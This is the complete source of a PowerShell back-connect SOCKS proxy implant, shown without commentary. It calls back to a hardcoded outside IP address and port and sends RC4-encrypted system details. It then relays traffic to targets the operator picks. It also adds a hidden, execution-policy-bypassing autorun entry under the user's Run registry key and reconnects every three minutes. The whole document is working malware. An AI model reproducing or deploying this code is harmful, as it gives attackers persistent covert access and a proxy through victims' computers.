$domain = '156.96.62.54' # host
$dport = 4001  # port

$x = New-Object byte[] 50

For ($i=0; $i -ne 50; $i++) { $x[$i] =  $i }

Function crypt4($passw, [int]$length, $buff0, $start, $sz)
{

	$rc4 = New-Object byte[] 256
	
	[int]$var0 = 0
	
	[int]$var1 = 0
	
	[int]$var2 = 0
	
	[int]$var3 = 0
	
	[int]$var4 = 0
	
	[int]$var5 = 0
	
	[int]$var6 = 0
	
	[int]$var7 = 0
	
	[int]$var8 = 0
	
	[int]$t = 0
	
	[int]$gs = 0
	
	For ($i=0; $i -le 255; $i++) { $rc4[$i] =  $i }
	
	do
	{
		 if ($gs -eq 0)
		 {
			 $var2 = 0

			 $var3 = $length
		 }

		 if ($gs -ne 0)
		 {
			 $gs = 0

			 $var2++

			 if (--$var3 -eq 0)
			 {
				 continue
			 }
			 
		 }
		 
		 $var7 = $rc4[$var0]

		 $t = $passw[$var2] -as[int]

		 $var1 += $t

		 $var1 = $var1 -band 255

		 $var1 += $var7

		 $var1 = $var1 -band 255

		 $var6 = $rc4[$var1]
		 
		 $rc4[$var0] = $var6

		 $rc4[$var1] = $var7

		 $var0++

		 $var0 = $var0 -band 255

		 if ($var0 -ne 0)
		 {
			 $gs = 1
			 
			 continue
		 }

		 $var4 = $sz

		 $var1 = 0

		 $var0 = 0

		 $var2 = 0

		 $var3 = 0
		 
		 do
		 {
			 $var2++

			 $var2 = $var2 -band 255

			 $var7 = $rc4[$var2]
			 
			 $var1 += $var7

			 $var1 = $var1 -band 255

			 $var8 = $rc4[$var1]

			 $rc4[$var2] = $var8

			 $rc4[$var1] = $var7

			 $var8 += $var7
	
			 $var8 = $var8 -band 255

			 $var0 = $rc4[$var8]
			 
			 $var5 = $buff0[$start + $var3]

			 $var5 = $var5 -bxor $var0
			 
			 $buff0[$start + $var3] = $var5 -as [byte]

			 $var3++
			 
			 if (--$var4 -eq 0)
			 {
				 break
			 }
		 }
		 
		 while($true)
		 
		 break
	}
	
	while($true)
}

$newconnct={
	
	 Param
	 (
		 $sArray,
		 $var2,
		 $ip,
		 $newport,
		 $xor_,
		 $s,
		 $w,
		 $r
	 )
	 
	 Function crypt42($passw, [int]$length, $buff0, $start, $sz)
	 {

		 $rc4 = New-Object byte[] 256
	
		 [int]$var0 = 0
	
		 [int]$var1 = 0
	
		 [int]$var2 = 0
	
		 [int]$var3 = 0
	
		 [int]$var4 = 0
	
		 [int]$var5 = 0
	
		 [int]$var6 = 0
	
		 [int]$var7 = 0
	
		 [int]$var8 = 0
	
		 [int]$t = 0
	
		 [int]$gs = 0
	
		 For ($i=0; $i -le 255; $i++) { $rc4[$i] =  $i }
	
		 do
		 {
			 if ($gs -eq 0)
			 {
				 $var2 = 0

				 $var3 = $length
			 }

			 if ($gs -ne 0)
			 {
				 $gs = 0

				 $var2++

				 if (--$var3 -eq 0)
				 {
					 continue
				 }
			 
			 }
		 
			 $var7 = $rc4[$var0]

			 $t = $passw[$var2] -as[int]

			 $var1 += $t

			 $var1 = $var1 -band 255

			 $var1 += $var7

			 $var1 = $var1 -band 255

			 $var6 = $rc4[$var1]
		 
			 $rc4[$var0] = $var6

			 $rc4[$var1] = $var7

			 $var0++

			 $var0 = $var0 -band 255

			 if ($var0 -ne 0)
			 {
				 $gs = 1
			 
				 continue
			 }

			 $var4 = $sz

			 $var1 = 0

			 $var0 = 0

			 $var2 = 0

			 $var3 = 0
		 
			 do
			 {
				 $var2++

				 $var2 = $var2 -band 255

				 $var7 = $rc4[$var2]
			 
				 $var1 += $var7

				 $var1 = $var1 -band 255

				 $var8 = $rc4[$var1]

				 $rc4[$var2] = $var8

				 $rc4[$var1] = $var7

				 $var8 += $var7
	
				 $var8 = $var8 -band 255

				 $var0 = $rc4[$var8]
			 
				 $var5 = $buff0[$start + $var3]

				 $var5 = $var5 -bxor $var0
			 
				 $buff0[$start + $var3] = $var5 -as [byte]

				 $var3++
			 
				 if (--$var4 -eq 0)
				 {
					 break
				 }
			 }
		 
			 while($true)
		 
			 break
		 }
	
		 while($true)
	 }
	 
	 [int]$tr = 0
	 
	 $cs = $null
	 
	 $bf = New-Object byte[] 65536
	 
	 $buffer = New-Object byte[] 13
	 
	 For ($i=0; $i -ne 13; $i++) { $buffer[$i] = 0x00 }
	 
	 $buffer[0] = $var2 -as [byte]
	 
	 $buffer[1]  = 0x0A
	 $buffer[3]  = 0x05
	 $buffer[6]  = 0x01

	 try
	 {
		 $_t = 1

		 $sArray[$var2] = New-Object System.Net.Sockets.TcpClient( $ip, $newport)
		 
		 $cs = $sArray[$var2];
	 
		 $sArray[$var2].NoDelay = $true
	 
		 $sArray[$var2].ReceiveTimeout = $_t * 1000
	 
		 $s[$var2] = $sArray[$var2].GetStream()
	 
		 $r[$var2] = New-Object System.IO.BinaryReader($s[$var2])
	 
		 $w[$var2] = New-Object System.IO.BinaryWriter($s[$var2])
		 
		 crypt42 $xor_ 50 $buffer 0 3
		 crypt42 $xor_ 50 $buffer 3 10
		 
		 $w[0].Write($buffer, 0, 13)
		 $w[0].Flush()
	 }
	 
	 catch
	 
	 {
		 #$sArray[$var2] = $null
		 
		 $buffer[4] = 0x01
		 
		 crypt42 $xor_ 50 $buffer 0 3
		 crypt42 $xor_ 50 $buffer 3 10
		 
		 $w[0].Write($buffer, 0, 13)
		 $w[0].Flush()
	 }
		 
	 try
	 {
		 do
		 {
			 try
		 
			 {
				 $st = [Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s"))
				 
				 $rc = $r[$var2].Read($bf, 3, 65530)
				  
				 if ($rc -eq 0) { break }
				 
			  }
			  
			 catch
			 
			 {
				 $end = [Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s"))
				 
				 $Time = $end - $st
				 
				 if ($Time -ge $_t)
				 {
					 continue
				 }
				 
				 break
			 }
			 
			 $bf[0] = $var2 -as[byte]
			 
			 $rc0 = $rc -band 0x000000ff
			 $rc1 = [math]::Floor(($rc -band 0x0000ff00) * [math]::Pow(2,-8))
			 
			 $bf[1] = $rc0 -as[byte]
			 $bf[2] = $rc1 -as[byte]
			 
			 crypt42 $xor_ 50 $bf 0 3
			 crypt42 $xor_ 50 $bf 3 $rc
			 
			 $w[0].Write($bf, 0, $rc + 3)
			 $w[0].Flush()
		 }
		 
		 while($sArray[$var2] -ne $null)
		 
	 }
	 
	 catch
	 
	 {
		 $tr++
	 }
	 
	 #$sArray[$var2] = $null
	 
	 $buffer[0] = $var2 -as [byte]
	 $buffer[1] = 0x00
	 $buffer[2] = 0x00
	 
	 crypt42 $xor_ 50 $buffer 0 3
	 
	 $w[0].Write($buffer, 0, 3)
	 $w[0].Flush()
	 
	 if ($cs -ne $null) { $cs.Close() }
	 
}

Function backnct([string]$domain, [int]$dport)
{
	 $buffer = New-Object byte[] 3
	 
	 $sArray = @(0) * 200
	 
	 For ($i=0; $i -ne 200; $i++) { $sArray[$i] = $null }
	 
	 $s = @(0) * 200
	 
	 $w = @(0) * 200
	 
	 $r = @(0) * 200
	 
	 $_t = 10
	 
	 [int]$tr = 0
	 
	 [int]$newport = 0
	 
	 [string]$ip
	 
	 [int]$var1 = 0
	 
	 [int]$var2 = 0
	 
	 [int]$var0 = 0
	 
	 [int]$var9 = 0
	 
	 [int]$var12 = 0
	 
	 [int]$rc = 0
	 
	 [int]$var10 = 0
	 
	 [int]$var11 = 0
	 
	 [int]$rm = 0
	 
	 [int]$rm4 = 0
	 
	 $j = New-Object object[] 200
	 
	 $bf0 = New-Object byte[] 65536

	 $bf1 = New-Object byte[] 65536

	 $rb = New-Object byte[] 65536
	 
	 try
	 
	 {
		 $pool = [RunspaceFactory]::CreateRunspacePool(1, 200)
		 $pool.Open()
		 
		 $sArray[0] = New-Object System.Net.Sockets.TcpClient( $domain, $dport)
	 
		 $sArray[0].NoDelay = $true
	 
		 $sArray[0].ReceiveTimeout = $_t * 1000
	 
		 $s[0] = $sArray[0].GetStream()
	 
		 $r[0] = New-Object System.IO.BinaryReader($s[0])
	 
		 $w[0] = New-Object System.IO.BinaryWriter($s[0])
		 
		 For ($i=0; $i -ne 50; $i++) { $bf0[$i] = $x[$i] }
		 
		 For ($i=50; $i -ne 100; $i++) { $bf0[$i] = 0 }
	 
		 $i64 = 0
	 
		 if ([IntPtr]::Size -eq 8) {$i64 = 1}
		 
		 $bf0[53] = $i64 -as[byte]
	 
		 $os = [system.environment]::osversion.version.build
	 
		 $o0 = $os -band 0x000000ff
		 $o1 = [math]::Floor(($os -band 0x0000ff00) * [math]::Pow(2,-8))
		 
		 $bf0[50] = $o0 -as[byte]
		 $bf0[51] = $o1 -as[byte]
	 
		 $bf0[54] = 0x50 -as[byte]
		 $bf0[55] = 0x53 -as[byte]
		 
		 crypt4 $x 50 $bf0 50 50
		 
		 $w[0].Write($bf0, 0, 100)
		 $w[0].Flush()
		 
	 	 while($true)
	 	 {
			 $st = [Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s"))
			 
			 try
		 
		 	 {
			 	 if ($var10 -eq 0 -and $rm4 -ne 4)
	 	 	 	 {
				 	 $rc = $r[0].Read($bf1, 0, 65536)
					 
					 if ($rc -eq 0)
					 {
						 Write-Warning "1"
						 
						 break
					 }
			 	 }
		 	 }
	 
		 	 catch
	 
		 	 {
			 	 $end = [Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s"))
				 
				 $Time = $end - $st
				 
			 	 if ($Time -ge $_t)
			 	 {
				 	 if ($rm -ne 0 -or $rm4 -ne 0) { break }
					 
				 	 continue
			 	 }
				 
			 	 break
		 	 }
			 
		 	 if ($rm -ne 0 -or $rm4 -eq 4)
	 	 	 {
			 	 if ($bf0[2 + 0] -eq 0x00 -as[byte] -and $bf0[2 + 1] -eq 0x00 -as[byte])
			 	 {
	 	 		 	 if ($bf0[0] -eq 0xFF -as[byte] -and $bf0[1] -eq 0xFE -as[byte])
	 	 		 	 {
	 	 			 	 $var12 = 1
						 
						 Write-Warning "3"
						 
	 	 			 	 break
	 	 		 	 }
					 
				 	 $var0 = $bf0[1]

	 	 		 	 if ($sArray[$var0] -ne $null) { $sArray[$var0] = $null }
	 	 	 	 }
			 
	 	 	 	 else
			 
	 	 	 	 {
	 	 		 	 if ($var10 -eq 0)
	 	 		 	 {
					 	 if ($rc -eq 0)
					 	 {
						 
						 	 try
						 
						 	 {
							 
							 	 $rc = $r[0].Read($bf1, 0, 65536)
								 
								 if ($rc -eq 0)
								 {
									 Write-Warning "3"
									 
									 break
								 }
							 
						 	 }
						 
						 	 catch
						 
						 	 {
								 
							 	 Write-Warning "34"
								 
								 break
							 
						 	 }
						 
					 	 }

					 	 if ($rc -lt 0 -or $rc -eq 0)
						 {
							 Write-Warning "4"
							 
							 break
						 }

					 	 For ($i=0; $i -ne $rc; $i++) { $rb[$i] = $bf1[$i] }

	 	 			 	 $var10 = $rc
					 
	 	 			 	 $var11 = 0
					 
					 	 $rc = 0
	 	 		 	 }
				 
	 	 		 	 $var9 = $rm
				 
				 	 $var0 = 256 * $bf0[2 + 1] + $bf0[2 + 0]

	 	 		 	 $var0 -= $var9
				 
	 	 		 	 if ($var10 -le $var0) { $var0 = $var10 }
				 
				 	 For ($i=0; $i -ne $var0; $i++) { $bf0[$i + $var9 + 4] = $rb[$i + $var11] }
				 
	 	 		 	 $var11 += $var0
				 
	 	 		 	 $var10 -= $var0
				 
	 	 		 	 $rm += $var0
					 
				 	 if ((256 * $bf0[2 + 1] + $bf0[2 + 0]) -eq $rm)
	 	 		 	 {
						 $var1 = 256 * $bf0[2 + 1] + $bf0[2 + 0]

						 crypt4 $x 50 $bf0 4 $var1
					 
	 	 			 	 $var2 = $bf0[1]
					 
	 	 			 	 if ($bf0[0] -eq 0xFF -as[byte] -and $bf0[1] -eq 0xFF -as[byte])
	 	 			 	 {
	 	 				 	 $tr++
					 	 }
					 
	 	 			 	 elseif ($bf0[0] -eq 0x00 -as[byte])
					 
	 	 			 	 {
						 	 if ($bf0[4 + 3] -eq 0x03 -as[byte])
						 	 {
							 	 $newport = 256 * $bf0[4 + 5 + $bf0[4 + 4] + 0] + $bf0[4 + 5 + $bf0[4 + 4] + 1]
								 
							 	 $fB = New-Object byte[] $bf0[4 + 4]
								 
							 	 For ($i=0; $i -ne $bf0[4 + 4] -as[int]; $i++) { $fB[$i] = $bf0[$i + 4 + 5] }
								 
							 	 [string]$ip = [System.Text.Encoding]::ASCII.GetString($fB)
						 	 }

						 	 elseif ($bf0[4 + 3] -eq 0x01 -as[byte])

						 	 {
							 	 [int]$a = $bf0[4 + 4 + 0] -as[int]
							 	 [int]$b = $bf0[4 + 4 + 1] -as[int]
							 	 [int]$c = $bf0[4 + 4 + 2] -as[int]
							 	 [int]$ip = $bf0[4 + 4 + 3] -as[int]

							 	 [string]$ip = "{0}.{1}.{2}.{3}" -f $a, $b, $c, $ip

							 	 $newport = 256 * $bf0[4 + 8 + 0] + $bf0[4 + 8 + 1]
						 	 }

						 	 else

                         	 {
							 	 [string]$ip = "hoonigan"

							 	 $newport = 0

						 	 }

							 $rp = [PowerShell]::Create()
							 $rp.RunspacePool = $pool

							 [void]$rp.AddScript($newconnct)
		
							 [void]$rp.AddParameter("sArray", $sArray)
							 [void]$rp.AddParameter("var2", $var2)
							 [void]$rp.AddParameter("ip", $ip)
							 [void]$rp.AddParameter("newport", $newport)
							 [void]$rp.AddParameter("xor_", $x)
							 [void]$rp.AddParameter("s", $s)
							 [void]$rp.AddParameter("w", $w)
							 [void]$rp.AddParameter("r", $r)
							 
							 $j[$i] = [PSCustomObject]@{
								 PowerShell = $rp
								 AsyncResult = $rp.BeginInvoke()
							 }
							 
						 }
					 
	 	 			 	 else
					 
	 	 			 	 {
						 	 try
						 
						 	 {
						 
							 	 $w[$var2].Write($bf0, 4, $var1)
							 	 $w[$var2].Flush()
							 
						 	 }
						 
						 	 catch
						 
						 	 {
							 
							 	 $tr++
							 
						 	 }
	 	 			 	 }
					 
	 	 			 	 $rm = 0
	 	 		 	 }
	 	 	 	 }
	 	 			 
	 	 	 	 $rm4 = 0

	 	 	 }
	 	 		 
	 	 	 else 
	 	 		
	 	 	 {
	 	 	 	 if ($var10 -eq 0)
	 	 	 	 {
				 	 if ($rc -eq 0)
				 	 {
					 
					 	 try
					 
					 	 {
						 
						 	 $rc = $r[0].Read($bf1, 0, 65536)
							 
							 if ($rc -eq 0)
							 {
								 Write-Warning "5"
								 break
							 }
							 
					 	 }
					 
					 	 catch
					 
					 	 {
							 Write-Warning "6"
						 	 break
						
					 	 }
					
				 	 }
					 

				 	 if ($rc -lt 0 -or $rc -eq 0)
					 {
						 Write-Warning "7"
						 break
					 }
					 
				 	 For ($i=0; $i -ne $rc; $i++) { $rb[$i] = $bf1[$i] }
				 
				 	 $var10 = $rc
				 
				 	 $var11 = 0
				 
				 	 $rc = 0
	 	 	 	 }
			 
	 	 	 	 $var0 = $rm4
			 
	 	 	 	 $var9 = 4
			 
	 	 	 	 $var9 -= $rm4
			 
	 	 	 	 if ($var10 -lt $var9) { $var9 = $var10 }
			 
			 	 For ($i=0; $i -ne $var9; $i++) { $bf0[$i + $var0] = $rb[$i + $var11] }
			 
	 	 	 	 $var11 += $var9
			 
	 	 	 	 $var10 -= $var9
			 
	 	 	 	 $rm4 += $var9
			 
	 	 	 	 if ($rm4 -eq 4) { crypt4 $x 50 $bf0 0 4 }
	 	 	 }
	 	 }
	 
	 	 if ($var12 -eq 1)
	 	 {
		 	 Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "socks"

		 	 [Environment]::Exit(0)
		 }
		 
		 throw "close"
	 
	 }
	 
	 catch
	 {
		 $message = $_
		 Write-Warning "Something happened! $message"
		 
		 $pool.Dispose()
		 
		 if ($sArray[0] -ne $null) { $sArray[0].Close() }
	 }
}

try
{
	 Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "socks" -Value "Powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""

}

catch { }

while($true)
{
	 backnct $domain $dport
	 
	 Start-Sleep -s 180
}